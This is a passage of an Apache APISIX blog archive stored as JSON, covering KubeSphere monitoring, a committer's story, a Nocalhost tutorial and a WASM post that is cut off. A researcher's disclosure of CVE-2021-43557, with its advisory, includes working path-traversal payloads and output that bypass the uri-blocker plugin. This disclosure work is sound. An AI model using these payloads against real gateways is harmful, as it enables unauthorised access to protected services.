graph to get a result similar to the one below. Save the template and get your first custom monitoring panel!\\n\\n![Get custom monitoring panel](https://static.apiseven.com/202108/1638241730747-298fe17e-fb34-4da6-ac9d-8b1efde4521c.png)\\n\\n>The Prometheus metrics currently provided by the Apache APISIX gateway can be found in the [available metrics section](https://apisix.apache.org/zh/docs/apisix/plugins/prometheus/#%25E5%258F%25AF%25E6%259C%2589%25E7%259A%2584%25E6%258C%2587%25E6%25A0%2587) of the official documentation.\\n\\nSince the metrics configuration process is a bit tricky, it is recommended to import the [Apache APISIX Grafana template](https://grafana.com/grafana/dashboards/11719) directly from the cluster-level \\"Custom Monitoring\\" (download the JSON and import it via \\"Local Upload\\").\\n\\n![Import Grafana template](https://static.apiseven.com/202108/1638241733535-168ce86b-6654-4278-941d-23fb44003c90.png)\\n\\nKubeSphere is also [actively working](https://github.com/kubesphere/kubesphere/issues/4433) on introducing the Grafana template import into the project\'s custom monitoring capabilities, so stay tuned!\\n\\n![Finish work](https://static.apiseven.com/202108/1638241735167-4c6d3a9a-8190-41b5-9e89-7f09384c7113.png)\\n\\n## Summary\\n\\nThis article is a very detailed step-by-step guide for you to fully understand and follow along with how to \\"interoperate Apache APISIX Ingress gateway with KubeSphere and perform custom monitoring\\". We hope that reading this article will deepen your understanding of Apache APISIX Ingress Controller and Apache APISIX application."},{"id":"Contributer to Committer journey @Apache APISIX","metadata":{"permalink":"/blog/2021/11/26/apache-apisix-committer-experience","source":"@site/blog/2021/11/26/apache-apisix-committer-experience.md","title":"Contributer to Committer journey @Apache APISIX","description":"This article describes how Shivam Singh has grown from contributor to Apache Committer in the Apache APISIX community from a personal perspective.","date":"2021-11-26T00:00:00.000Z","formattedDate":"November 26, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":3.675,"truncated":true,"authors":[{"name":"Shivam Singh","url":"https://github.com/1502shivam-singh","imageURL":"https://avatars.githubusercontent.com/u/57267960?v=4"}],"prevItem":{"title":"Using APISIX Ingress to access custom monitoring in KubeSphere","permalink":"/blog/2021/11/30/use-apisix-ingress-in-kubesphere"},"nextItem":{"title":"APISIX request_uri variable with risk of path penetration","permalink":"/blog/2021/11/23/cve-2021-43557-research-report"}},"content":"> In this article, Shivam Singh ([@1502shivam-singh](https://github.com/1502shivam-singh)) gives a brief of his journey from starting out in the Apache APISIX community, from a contributor to an Apache member and APISIX committer. His journey can help other people looking to startup in the Apache APISIX community or Open Source in general.\\n\x3c!--truncate--\x3e\\n\\n## About me\\n\\nHello reader,<br/>\\nI am **Shivam Singh**, an undergraduate student from **Indian Institute of Information Technology, Una, India**. I recently became a **Committer at Apache APISIX**, and hence a **member of the Apache Software Foundation**. I\'m a Full-stack Engineer and Product designer who believes that every great product is a culmination of Engineering & Design with a blend of art to bring visual delight while effectively & efficiently solving critical end user problem in every sense of it.\\n\\nMy interest lies in all things creative and **love to create products**, starting straight from bare conceptualisation till product completion and delivery, covering all things engineering and design in between.\\n\\nApart from this I am an art and music connoisseur. Sometimes, you can find me listening to the same hiphop playlist for hours trying to make sense of every lyric and catching all the rhymes and double entendres in between. But enough about me, let\'s dwell into my journey as that\'s why you are reading probably (will try my best to keep it short).\\n\\n## Exploring beyond boundaries\\n\\nI have had a great time at Apache APISIX, working alongside highly cooperative, kind and humble people and feel writing down this journey of mine here would be a great starting point for anyone looking to enter this eternal space of Open Source with Apache APISIX. Though I believe everyone has their very own different journey and we can\'t just generalize, I will try to mention some points along that can help anyone irrespective, in easing their exploration struggles.\\n\\nSo it all started from February, 2021. I was looking around GitHub to find OSS projects to contribute to, so as to use my knowledge for something that actually provides value to users. I would recommend people to check out the GSoC organisations page, try online searches or look for some GitHub repos that have a list of organisations for getting a starting point. Of Course you can contribute to projects randomly online, but I think this could be an efficient method. After looking around and testing multiple waters, I came across Apache APISIX. I looked up their JIRA and got in contact with [Zhiyuan Ju](https://github.com/juzhiyuan) (**PMC at Apache APISIX, and a great guy to work with**). After I got the slack invite from him to asf-slack, things started to get in motion. I picked up issues from the [apisix-website](https://github.com/apache/apisix-website) repository and worked along.\\n\\n## New perspective to APISIX\\n\\nWhile I was working on the website, I noticed that it was lacking on a lot of fronts and there was a wide gap between features that Apache APISIX provides and what was presented on the website. I discussed this with Zhiyuan and he agreed with my opinion. As [Google Summer of Code](https://summerofcode.withgoogle.com/archive/) was near, I proposed that I work on this project under this program. We both discussed this thoroughly and agreed on it. Through this project I met [Shuyang Wu](http://github.com/yiyiyimu), another awesome guy. Zhiyuan, Shuyang and Ming Wen were my mentors for this project. We started off in May and finally the new website was successfully up by September, 2021.\\n\\n![image](https://static.apiseven.com/202108/1637932868348-92a9ab4c-f5ef-4141-b026-3fec13a2e3dc.png)\\n\\nBeing able to help the organisation by increasing its reach and improving its branding was a great experience for me. This has taken my experience at Apache APISIX to the next stage where I actively contribute to the organisation in areas of UX Engineering (UX Design + Frontend engineering), product and growth. My efforts being recognised and getting voted for a member and committer truly inspires me and I hope to do more on and on :)\\n\\n## Summarizing\\n\\nLastly, for all the students or people starting out in OSS, my one piece of advice would be to try to love what you do and think more in terms of creating products. Why ? because to be able to create something that can be usable and useful for others, is I believe the main idea behind the existence of OSS. **Explore and find what you like and then obsess over it**.\\n\\nThanks for reading along and your time.\\n> Shivam Singh<br/>\\n> [Mail](mailto:singhsh@apache.org), [GitHub](https://github.com/1502shivam-singh/), [Twitter](https://twitter.com/Shivam15_)"},{"id":"APISIX request_uri variable with risk of path penetration","metadata":{"permalink":"/blog/2021/11/23/cve-2021-43557-research-report","source":"@site/blog/2021/11/23/cve-2021-43557-research-report.md","title":"APISIX request_uri variable with risk of path penetration","description":"This article describes the author\'s research on the unsafe use of the $request_uri variable in the Apache APISIX Ingress Controller.","date":"2021-11-23T00:00:00.000Z","formattedDate":"November 23, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":3.865,"truncated":true,"authors":[{"name":"Marcin Niemiec","url":"https://github.com/xvnpw","imageURL":"https://avatars.githubusercontent.com/u/17719543?v=4"}],"prevItem":{"title":"Contributer to Committer journey @Apache APISIX","permalink":"/blog/2021/11/26/apache-apisix-committer-experience"},"nextItem":{"title":"Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)","permalink":"/blog/2021/11/23/cve-2021-43557"}},"content":"> Research report about Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)\\n\\n\x3c!--truncate--\x3e\\n\\nIn this article I will present my research on insecure usage of\xa0`$request_uri`\xa0variable in\xa0[Apache APISIX](https://github.com/apache/apisix-ingress-controller/)\xa0ingress controller. My work end up in submit of security vulnerability, which was positively confirmed and got CVE-2021-43557\\\\. At the end of article I will mention in short\xa0[Skipper](https://github.com/zalando/skipper)\xa0which I tested for same problem.\\n\\n> Apache APISIX is a dynamic, real-time, high-performance API gateway. APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, circuit breaking, authentication, observability, and more.\\n\\nWhy\xa0`$request_uri`\xa0? This\xa0[variable](https://nginx.org/en/docs/http/ngx_http_core_module.html#var_request_uri)\xa0is many times used in authentication and authorization plugins. It\u2019s\xa0**not normalized**, so giving a possibility to bypass some restrictions.\\n\\nIn Apache APISIX there is no typical functionality of external authentication/authorization. You can write your own plugin, but it\u2019s quite complicated. To prove that APISIX is vulnerable to path-traversal I will use\xa0`uri-blocker`\xa0plugin. I\u2019m suspecting that other plugins are also vulnerable but this one is easy to use.\\n\\n## Setting the\xa0stage\\n\\nInstall Apache APISIX into Kubernetes. Use Helm Chart with version\xa0**0.7.2**:\\n\\n```shell\\nhelm repo add bitnami https://charts.bitnami.com/bitnami\\nhelm repo update\\nkubectl create ns ingress-apisix\\nhelm install apisix apisix/apisix \\\\\\n  --set gateway.type=NodePort \\\\\\n  --set ingress-controller.enabled=true \\\\\\n  --namespace ingress-apisix \\\\\\n  --version 0.7.2\\nkubectl get service --namespace ingress-apisix\\n```\\n\\nIn case of problems follow\xa0[official guide](https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/deployments/minikube.md).\\n\\nTo create\xa0_ingress route_, you need to deploy\xa0`ApisixRoute`\xa0resource:\\n\\n```yaml\\napiVersion: apisix.apache.org/v2beta1\\nkind: ApisixRoute\\nmetadata:\\n  name: public-service-route\\nspec:\\n  http:\\n  - name: public-service-rule\\n    match:\\n      hosts:\\n      - app.test\\n      paths:\\n      - /public-service/*\\n    backends:\\n        - serviceName: public-service\\n          servicePort: 8080\\n    plugins:\\n      - name: proxy-rewrite\\n        enable: true\\n        config:\\n          regex_uri: [\\"/public-service/(.*)\\", \\"/$1\\"]\\n  - name: protected-service-rule\\n    match:\\n      hosts:\\n      - app.test\\n      paths:\\n      - /protected-service/*\\n    backends:\\n        - serviceName: protected-service\\n          servicePort: 8080\\n    plugins:\\n      - name: uri-blocker\\n        enable: true\\n        config:\\n          block_rules: [\\"^/protected-service(/?).*\\"]\\n          case_insensitive: true\\n      - name: proxy-rewrite\\n        enable: true\\n        config:\\n          regex_uri: [\\"/protected-service/(.*)\\", \\"/$1\\"]\\n```\\n\\nLet\u2019s dive deep into it:\\n\\n- It creates routes for\xa0`public-service`\xa0and\xa0`private-service`\\n- There is\xa0`proxy-rewrite`\xa0turned on to remove prefixes\\n- There is\xa0`uri-blocker`\xa0plugin configured for\xa0`protected-service`. It can look like mistake but this plugin it about to block any requests starting with\xa0`/protected-service`\\n\\n## Exploitation\\n\\nI\u2019m using Apache APISIX in version\xa0**2.10.0**.\\n\\nReaching out to Apache APISIX routes in minikube is quite inconvenient:\xa0`kubectl exec -it -n ${namespace of Apache APISIX} ${Pod name of Apache APISIX} -- curl --path-as-is http://127.0.0.1:9080/public-service/public -H \'Host: app.test\'`. To ease my pain I will write small script that will work as template:\\n\\n```shell\\n#/bin/bash\\n\\nkubectl exec -it -n ingress-apisix apisix-dc9d99d76-vl5lh -- curl --path-as-is http://127.0.0.1:9080$1 -H \'Host: app.test\'\\n```\\n\\nIn your case replace\xa0`apisix-dc9d99d76-vl5lh`\xa0with name of actual Apache APISIX pod.\\n\\nLet\u2019s start with validation if routes and plugins are working as expected:\\n\\n```shell\\n$ ./apisix_request.sh \\"/public-service/public\\"\\nDefaulted container \\"apisix\\" out of: apisix, wait-etcd (init)\\n{\\"data\\":\\"public data\\"}\\n```\\n\\n```shell\\n$ ./apisix_request.sh \\"/protected-service/protected\\"\\nDefaulted container \\"apisix\\" out of: apisix, wait-etcd (init)\\n<html>\\n<head><title>403 Forbidden</title></head>\\n<body>\\n<center><h1>403 Forbidden</h1></center>\\n<hr><center>openresty</center>\\n</body>\\n</html>\\n```\\n\\nYep.\xa0`public-service`\xa0is available and\xa0`protected-service`\xa0is blocked by plugin.\\n\\nNow let\u2019s test payloads:\\n\\n```shell\\n$ ./apisix_request.sh \\"/public-service/../protected-service/protected\\"\\nDefaulted container \\"apisix\\" out of: apisix, wait-etcd (init)\\n{\\"data\\":\\"protected data\\"}\\n```\\n\\nand second one:\\n\\n```shell\\n$ ./apisix_request.sh \\"/public-service/..%2Fprotected-service/protected\\"\\nDefaulted container \\"apisix\\" out of: apisix, wait-etcd (init)\\n{\\"data\\":\\"protected data\\"}\\n```\\n\\nAs you can see in both cases I was able to bypass uri restrictions.\\n\\n### Root cause\\n\\n`uri-blocker`\xa0plugin is using\xa0`ctx.var.request_uri`\xa0variable in logic of making blocking decision. You can check it in\xa0[code](https://github.com/apache/apisix/blob/11e7824cee0e4ab0145ea7189d991464ade3682a/apisix/plugins/uri-blocker.lua#L98):\\n\\n![Cause](https://static.apiseven.com/202108/1637634166887-e3805291-5b00-4b7b-9936-0490266f4ed8.png)\\n\\n### Impact\\n\\n- Attacker can bypass access control restrictions and perform successful access to routes that shouldn\u2019t be able to;\\n- Developers of custom plugins have no knowledge that\xa0`ngx.var.request_uri`\xa0variable is untrusted.\\n\\nSearch for usage of\xa0`var.request_uri`\xa0gave me a hint that maybe\xa0[authz-keycloak plugin](https://github.com/apache/apisix/blob/master/docs/en/latest/plugins/authz-keycloak.md)\xa0is affected. You can see\xa0[this code](https://github.com/apache/apisix/blob/a3d42e66f60673e408cab2e2ceedc58aee450776/apisix/plugins/authz-keycloak.lua#L578), it looks really nasty. If there is no normalization on keycloak side, then there is high potential for vulnerablity.\\n\\n### Mitigation\\n\\nIn case of custom plugins, I suggest to do path normalization before using\xa0`ngx.var.request_uri`\xa0variable. There are also two other variables, high probably normalized, to check\xa0`ctx.var.upstream_uri`\xa0and\xa0`ctx.var.uri`.\\n\\n## Skipper\\n\\nSkipper is another ingress controller that I have investigated. It\u2019s not easy to install it in kubernetes, because deployment guide and helm charts are outdated. Luckily I have found issue page where developer was describing how to install it. This ingress gives possibility to implement external authentication based on\xa0[webhook filter](https://opensource.zalando.com/skipper/reference/filters/#webhook):\\n\\n```yaml\\napiVersion: networking.k8s.io/v1\\nkind: Ingress\\nmetadata:\\n  name: my-ingress\\n  annotations:\\n    zalando.org/skipper-filter: |\\n            modPath(\\"^/.*/\\", \\"/\\") -> setRequestHeader(\\"X-Auth-Request-Redirect\\", \\"${request.path}\\") -> webhook(\\"http://auth-service.default.svc.cluster.local:8080/verify\\")\\n```\\n\\nTo add some interesting headers that could help in access control decision, you need to do it manually with\xa0`setRequestHeader`\xa0filter. There is template available to inject variable by\xa0`${}`. Sadly (for attackers)\xa0`${request.path}`\xa0is having normalized path. I see in code that developers are not using\xa0_easily_\xa0`RequestURI`\xa0or\xa0`originalRequest`.\\n\\nI wasn\u2019t able to exploit path traversal in this case. Skipper remains safe.\\n\\n## Summary\\n\\nApache APISIX is vulnerable for path traversal. It\u2019s not affecting any external authentication, but plugins that are using\xa0`ctx.var.request_uri`\xa0variable.\\n\\nWhole code of this example is here\xa0[https://github.com/xvnpw/k8s-CVE-2021-43557-poc](https://github.com/xvnpw/k8s-CVE-2021-43557-poc)."},{"id":"Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)","metadata":{"permalink":"/blog/2021/11/23/cve-2021-43557","source":"@site/blog/2021/11/23/cve-2021-43557.md","title":"Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)","description":"Using the $request_uri variable in the Apache APISIX Ingress Controller, there is a processing announcement that \\"bypasses some restrictions\\" leading to the risk of path penetration.","date":"2021-11-23T00:00:00.000Z","formattedDate":"November 23, 2021","tags":[{"label":"Vulnerabilities","permalink":"/blog/tags/vulnerabilities"}],"readingTime":1.54,"truncated":true,"authors":[{"name":"Sylvia","url":"https://github.com/SylviaBABY","imageURL":"https://avatars.githubusercontent.com/u/39793568?v=4"}],"prevItem":{"title":"APISIX request_uri variable with risk of path penetration","permalink":"/blog/2021/11/23/cve-2021-43557-research-report"},"nextItem":{"title":"Develop APISIX Ingress Controller with Nocalhost in K8s","permalink":"/blog/2021/11/22/develop-apisix-ingress-with-nocalhost-in-kubernetes"}},"content":"> In versions prior to Apache APISIX 2.10.2, there was a problem of \\"bypassing partial restrictions\\" that caused the risk of path penetration by using the $request_uri variable in Apache APISIX Ingress Controller.\\n\\n\x3c!--truncate--\x3e\\n\\n## Problem Description\\n\\nIn versions prior to Apache APISIX 2.10.2, there was a problem of \\"bypassing partial restrictions\\" that caused the risk of path penetration by using the $request_uri variable in Apache APISIX Ingress Controller.\\n\\nWhen using the `uri-blocker` plug-in to test the scenario, we found that:\\n\\n```shell\\n$ ./apisix_request.sh \\"/public-service/public\\"\\nDefaulted container \\"apisix\\" out of: apisix, wait-etcd (init)\\n{\\"data\\":\\"public data\\"}\\n```\\n\\n```shell\\n$ ./apisix_request.sh \\"/protected-service/protected\\"\\nDefaulted container \\"apisix\\" out of: apisix, wait-etcd (init)\\n<html>\\n<head><title>403 Forbidden</title></head>\\n<body>\\n<center><h1>403 Forbidden</h1></center>\\n<hr><center>openresty</center>\\n</body>\\n</html>\\n```\\n\\nIn both scenarios, `public-service` is available and `protected-service` is blocked by plug-ins. After the verification and testing of the above scenarios, it is found that both cases can bypass the limitations of Uri.\\n\\nDue to the improper use of `ctx.var.require_uri` variables by the `uri-blocker` plug-in, the following results:\\n\\n- Attacker can bypass access control restrictions and perform successful access to routes that shouldn\u2019t be able to;\\n- Developers of custom plugins have no knowledge that `ngx.var.request_uri` variable is untrusted.\\n\\n## Affected Versions\\n\\nAll versions of Apache APISIX prior to 2.10.2 (excluding 2.10.2)\\n\\n## Solution\\n\\nThis issue has been resolved in version [2.10.2](http://apisix.apache.org/downloads/) +, please update to the relevant version as soon as possible.\\n\\nIn case of custom plugins, we suggest to do path normalization before using `ngx.var.request_uri` variable. There are also two other variables, high probably normalized, to check `ctx.var.upstream_uri` and `ctx.var.uri`.\\n\\n## Vulnerability details\\n\\nVulnerability public date: November 22, 2021\\nCVE details: https://nvd.nist.gov/vuln/detail/CVE-2021-43557\\n\\n## Contributor Profile\\n\\nThe vulnerability was discovered by community user Marcin Niemiec (GitHub[@xvnpw](https://github.com/xvnpw)) and reported to the Apache Software Foundation in a timely manner.\\n\\nThanks to Marcin Niemiec for his contribution to the Apache APISIX community."},{"id":"Develop APISIX Ingress Controller with Nocalhost in K8s","metadata":{"permalink":"/blog/2021/11/22/develop-apisix-ingress-with-nocalhost-in-kubernetes","source":"@site/blog/2021/11/22/develop-apisix-ingress-with-nocalhost-in-kubernetes.md","title":"Develop APISIX Ingress Controller with Nocalhost in K8s","description":"This article introduces the use of Nocalhost to seamlessly connect a local development machine to a remote K8s and develop and debug APISIX Ingress Controller with IDE.","date":"2021-11-22T00:00:00.000Z","formattedDate":"November 22, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":4,"truncated":true,"authors":[{"name":"Garry Chen","url":"https://github.com/neaped","imageURL":"https://avatars.githubusercontent.com/u/3713305?v=4"}],"prevItem":{"title":"Apache APISIX Path traversal in request_uri variable(CVE-2021-43557)","permalink":"/blog/2021/11/23/cve-2021-43557"},"nextItem":{"title":"Apache APISIX embraces the WASM ecosystem","permalink":"/blog/2021/11/19/apisix-supports-wasm"}},"content":"> This article walks you through using Nocalhost to seamlessly connect your local development machine to a remote Kubernetes cluster, allowing you to use IDE to develop and debug Apache APISIX Ingress Controller. Giving you the ability to comfortably develop and debug your remote apps with your existing skills.\\n\\n\x3c!--truncate--\x3e\\n\\n## Prerequisites\\n\\n- Prepare an available Kubernetes cluster in your workstation. You can use any Kubernetes clusters that you have namespace admin privilege.\\n- [Helm v3.0+](https://helm.sh) installed\\n- GoLand IDE 2020.03+ (Use GoLand 2021.2 in this article)\\n- [Install Nocalhost JetBrains plugin](https://nocalhost.dev/docs/installation#install-jetbrains-plugin)\\n- Install [Go 1.13](https://golang.org/dl/) or later\\n\\n## Deploy Apache APISIX Ingress Controller\\n\\nI\'m going to deploy Apache APISIX Ingress Controller by Nocalhost within GoLand:\\n\\n1. Open the Nocalhost plugin within GoLand\\n2. Use the cluster inspector to select the namespace that you want to deploy.\\n3. Right-click the selected namespace, choose **`Deploy Application`**, and select **`Helm Repo`** as installation method.\\n4. In the following dialog box, input:\\n\\n    1. `apisix-ingress-controller` as `Name`\\n    2. `https://charts.apiseven.com` as `Chart URL`\\n\\n![Deploy APISIX ingress controller](https://static.apiseven.com/202108/1637131316244-f1a58c88-8628-4918-a4c4-1ad287742fd0.gif)\\n\\nLet\'s test the `apisix-ingress-controller` after deployment by enable the port-forwarding within IDE:\\n\\n1. Find the `apisix-ingress-controller` workload in the cluster inspector, right-click and select the **`Port Forward`**\\n2. Add the port-forwarding `8080:8080`\\n3. Visiting the [`http://127.0.0.1:8080/healthz`](http://127.0.0.1:8080/healthz) in local and check the result\\n\\n![APISIX Ingress test](https://static.apiseven.com/202108/1637131450462-842c3baf-b7a4-4598-be0b-27486bf1cf28.gif)\\n\\n## Developing\\n\\n### Step 1: Start DevMode\\n\\n1. Right-click the deployment `apisix-ingress-controller` in cluster inspector, select **`Start DevMode`**\\n2. Choose your source code directory if you have already cloned in local, or let Nocalhost clone the source code for you by entering the **apache/apisix-ingress-controller** [repository URL](https://github.com/apache/apisix-ingress-controller.git)\\n3. Wait for the operations, Nocalhost will open the remote terminal within IDE after entering DevMode\\n\\nNow start the `apisix-ingress-controller` process by entering the following command in the remote terminal:\\n\\n```bash\\ngo run main.go ingress --config-path conf/config-default.yaml\\n```\\n\\nAfter the `apisix-ingress-controller` has started, access the service by visiting [`http://127.0.0.1:8080/healthz`](http://127.0.0.1:8080/healthz) on local and check the result.\\n\\n![Enter DevMode](https://static.apiseven.com/202108/1637131513751-b9184c10-4da3-4ab2-b403-56ae2360704a.gif)\\n\\n### Step 2: Change code and check result\\n\\nNow I will make some code changes and check the result.\\n\\n1. Stop the `apisix-ingress-controller` process\\n2. Search `healthz` and find the `router.go` file. Change the `healthzResponse` status code from `ok` to `Hello Nocalhost`\\n3. Start the process again and check the change result in local\\n\\n![Code change](https://static.apiseven.com/202108/1637131699629-a0766f66-0faa-4bf8-9013-284e5f2bdd57.gif)\\n\\n### Step 3. End DevMode\\n\\nNow close the development window and end DevMode.\\n\\n1. Right-click the `apisix-ingress-controller` in the cluster inspector\\n2. Select **`End DevMode`**\\n\\nNocalhost will make `apisix-ingress-controller` end development mode, and reset the `apisix-ingress-controller` Pod to its original version. Enable the port-forwarding and check the result after ending DevMode.\\n\\n![End DevMode](https://static.apiseven.com/202108/1637131766524-dba7b756-ae0b-42d1-8ff0-6ac14059ce11.gif)\\n\\n**Code Change**: All code changes in development mode will **only take effect** in the development container.\\n\\nAfter exiting the development mode, Nocalhost will reset the remote container to its original state (before the code is modified). In this way, after exiting the development mode, the modification of the code will **not** cause any changes or impact on the original environment.\\n\\n## Debugging\\n\\nDebugging an application is not easy, and debugging an application in the Kubernetes cluster is even more difficult. Nocalhost is here to help by providing the same debugging experience you\'re used in the IDE when debugging in the remote Kubernetes cluster.\\n\\n### Step 1: Start remote debugging\\n\\nWe can start remote debugging by:\\n\\n1. Right-click `apisix-ingress-controller` and choose **`Remote Debug`**\\n2. Nocalhost will put `apisix-ingress-controller` into DevMode and run debug command defined in [`dev config`](https://nocalhost.dev/zh-CN/docs/config/config-develop) automatically\\n\\n![Start remote debugging](https://static.apiseven.com/202108/1637132327260-7bba1d81-cf70-4982-9a07-51cc379e6bea.gif)\\n\\n### Step 2: Step through breakpoints\\n\\nNow set a breakpoint on the `healthz` function. Hover over just to the left of the line number and click on the red dot. Once it\u2019s set, visit [`http://127.0.0.1:8080/healthz`](http://127.0.0.1:8080/healthz) in your local browser, GoLand should pop to the foreground. Click the play button to close the request and the progress should continue loading.\\n\\nIn addition, as I enable the `dev.hotReload`, so every time you make the code change, Nocalhost will automatically re-run the debug command. This is very useful when you make the code change and debug frequently.\\n\\n![Setting up breakpoints and run service](https://static.apiseven.com/202108/1637132455552-86f44c0c-94d1-4ad9-a79d-0e2c6957d60b.gif)\\n\\n## Remote Run\\n\\nNot just remote debugging, Nocalhost also provides an easy way to run your Go service in the Kubernetes cluster, plus hot reload!\\n\\nYou can using the remote run feature by:\\n\\n1. Right-click `apisix-ingress-controller` in cluster inspector, choose **`Remote Run`**\\n2. Nocalhost will put `apisix-ingress-controller` into development mode and and run start command defined in [`dev config`](https://nocalhost.dev/zh-CN/docs/config/config-develop) automatically\\n\\nNow every time you make code changes, Nocalhost will automatically trigger the run command. You can now enjoy the hot reload for Go without complex configuration.\\n\\n![Remote run](https://static.apiseven.com/202108/1637133046432-84810667-c3ee-4d71-8a33-eb1833fd9ce2.gif)\\n\\n## Conclusion\\n\\nWe\u2019ve learned how to use Nocalhost to develop and debug the APISIX Ingress Controller in Kubernetes. Now, instead of waiting for slow local development processes, we can iterate quickly with an instant feedback loop and a productive cloud-native development environment."},{"id":"Apache APISIX embraces the WASM ecosystem","metadata":{"permalink":"/blog/2021/11/19/apisix-supports-wasm","source":"@site/blog/2021/11/19/apisix-supports-wasm.md","title":"Apache APISIX embraces the WASM ecosystem","description":"This article introduces why the cloud native API gateway Apache APISIX chooses Proxy Wasm for its functionality and how to use Wasm in Apache APISIX.","date":"2021-11-19T00:00:00.000Z","formattedDate":"November 19, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"}],"readingTime":7.85,"truncated":true,"authors":[{"name":"Zexuan Luo","url":"https://github.com/spacewander","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"}],"prevItem":{"title":"Develop APISIX Ingress Controller with Nocalhost in K8s","permalink":"/blog/2021/11/22/develop-apisix-ingress-with-nocalhost-in-kubernetes"},"nextItem":{"title":"How to integrate with Dapr to build Apache APISIX Gateway Controller","permalink":"/blog/2021/11/17/dapr-with-apisix"}},"content":"> Support for WASM will be added in the upcoming Apache APISIX version (2.11.0)! By reading this article you will learn how Apache APISIX deploys the support and development of this feature from 0 to 1.\\n\\n\x3c!--truncate--\x3e\\n\\nIn the upcoming release of Apache APISIX 2.11.0, we will add support for WASM! You can develop plugins in WASM, Lua, Java, Go, Python, JavaScript with Apache APISIX 2.11.0.\\n\\n![Support WASM](https://static.apiseven.com/202108/1637289637179-ab74d38f-acd4-4401-908f-e1d310a33583.png)\\n\\nWASM, known as [WebAssembly](https://webassembly.org/), differs from the specific programming language runtimes mentioned above, is a set of bytecode standards specifically designed to be used nested in a host environment.\\nIf a programming language provides the ability to compile to WASM bytecode, applications written in that language can be compiled to WASM bytecode and run in some WASM-enabled host environment.\\n\\nDoesn\'t it sound like you can run any application like an operating system as long as the host environment supports WASM?\\n\\nBut there is a limitation here. Just like an operating system needs to implement a specific standard syscall, in order to run a specific application, you need to implement the API required for that application.\\n\\nTake JavaScript for example, although it is also JavaScript code, JS modules written for browsers can\'t be used directly in npm packages, because the APIs are different.\\n\\nSo just putting WASM into Apache APISIX doesn\'t work. To allow developers to run WASM on Apache APISIX, we also need to provide a special API.\\n\\n## Why Proxy WASM\\n\\nWe weighed two options on how to provide this API.\\n\\n1. Implement the corresponding WASM version of the API by referring to the lua-nginx-module interface\\n2. Implement Proxy WASM as a set of standards\\n\\n[Proxy WASM](https://github.com/proxy-wasm/spec) is Envoy\'s WASM API standard. So the above question is really equivalent to, do we make our own API standard or do we reuse Envoy\'s existing standard?\\n\\n> The WASM API standard can be broken down into two aspects:\\n    1. Host, which is responsible for providing the implementation of the API\\n    2. SDK, which is responsible for implementing a set of glue layers in a different programming language in order to call the provided APIs in that language\\n\\nIf we follow Envoy\'s standards, the advantage is that we can reuse Envoy\'s existing WASM SDK (Proxy WASM SDK), while the disadvantage is that this set of standards is developed by Envoy in conjunction with its own situation, and if we follow the implementation, tailoring it to meet our own demands is difficult.\\n\\nAfter some community discussion, we finally decided to adopt the Proxy WASM standard. \\"Doing the hard and right thing\\" is naturally the hard thing to do, but we believe it is the right thing to do, and through community collaboration and building together, we can build a more prosperous ecosystem.\\n\\n## How to use WASM in Apache APISIX\\n\\nApache APISIX now has initial support for WASM, which can be used to write parts of the fault-injection plugin. You can try it in Apache APISIX 2.11.0 at the end of this month, so stay tuned!\\n\\nIn the following, we will talk about how to use WASM to inject custom responses in conjunction with [proxy-wasm-go-sdk](https://github.com/tetratelabs/proxy-wasm-go-sdk/).\\n\\n### Step 1: Write code based on proxy-wasm-go-sdk\\n\\nThe implementation code (including go.mod and others) can be found at [here](https://github.com/apache/apisix/tree/master/t/wasm).\\n\\nIt should be explained that although the proxy-wasm-go-sdk project carries the Go name, it actually uses tinygo instead of native Go, which has some problems supporting WASI (which you can think of as a non-browser WASM runtime interface), see [here](https://github.com/tetratelabs/proxy-wasm-go-sdk/blob/main/doc/OVERVIEW.md#tinygo-vs-the-official-go-compiler) for more details.\\n\\n### Step 2: Build the corresponding WASM file\\n\\n```shell\\ntinygo build -o ./fault-injection/main.go.wasm -scheduler=none -target=wasi ./fault-injection/main.go\\n```\\n\\n### Step 3: Refer to this file in `config.yaml` in Apache APISIX\\n\\n```yaml\\napisix:\\n        ...\\nwasm:\\n    plugins:\\n        - name: wasm_fault_injection\\n          priority: 7997\\n          file: t/wasm/fault-injection/main.go.wasm\\n```\\n\\nBy doing so, you can use this WASM plugin as if it were a Lua plugin. For example:\\n\\n```yaml\\n---\\nuri: \\"/wasm\\"\\nplugins:\\n  wasm_fault_injection:\\n    conf: \'{\\"body\\":\\"hello world\\", \\"http_status\\":200}\'\\nupstream:\\n  type: roundrobin\\n  nodes:\\n    127.0.0.1:1980: 1\\n```\\n\\nNote that the configuration of the WASM plugin is a string under the conf field, which is parsed by the corresponding plugin itself.\\n\\n## Cross-sectional evaluation\\n\\nApache APISIX has evolved to the point where there are three ways to write plugins:\\n\\n1. Native Lua way, running inside of APISIX.\\n2. External plugin runner for multiple languages, where the plugin logic runs outside of APISIX.\\n3. Compile multiple languages into WASM, still running inside of APISIX.\\n\\n![APISIX ecosystem](https://static.apiseven.com/202108/1637289637159-f2fd1f09-4be6-4cd4-88a0-9c3a23c4f405.png)\\nThese three approaches are very different in various aspects such as ecology and maturity. It just so happens that we can use them all for fault-injection, so we can compare them.\\n\\n### Step 1: Configure Routing\\n\\nThe Lua way of fault-injection, naturally, uses the built-in fault-injection plugin.The Runner way fault-injection implementation can be found [here](https://github.com/apache/apisix-go-plugin-runner/blob/master/cmd/go-runner/plugins/fault_injection.go).\\n\\nLet\'s configure different routes for each of them.\\n\\n```yaml\\n---\\nuri: \\"/wasm\\"\\nplugins:\\n  wasm_fault_injection:\\n    conf: \'{\\"body\\":\\"hello world\\", \\"http_status\\":200}\'\\nupstream:\\n  type: roundrobin\\n  nodes:\\n    127.0.0.1:1980: 1\\n---\\nplugins:\\n  ext-plugin-pre-req:\\n    conf:\\n    - name: fault-injection\\n      value: \'{\\"body\\":\\"hello world\\", \\"http_status\\":200}\'\\nupstream:\\n  nodes:\\n    127.0.0.1:1980: 1\\n  type: roundrobin\\nuri: /ext-plugin\\n---\\nplugins:\\n  fault-injection:\\n    abort:\\n      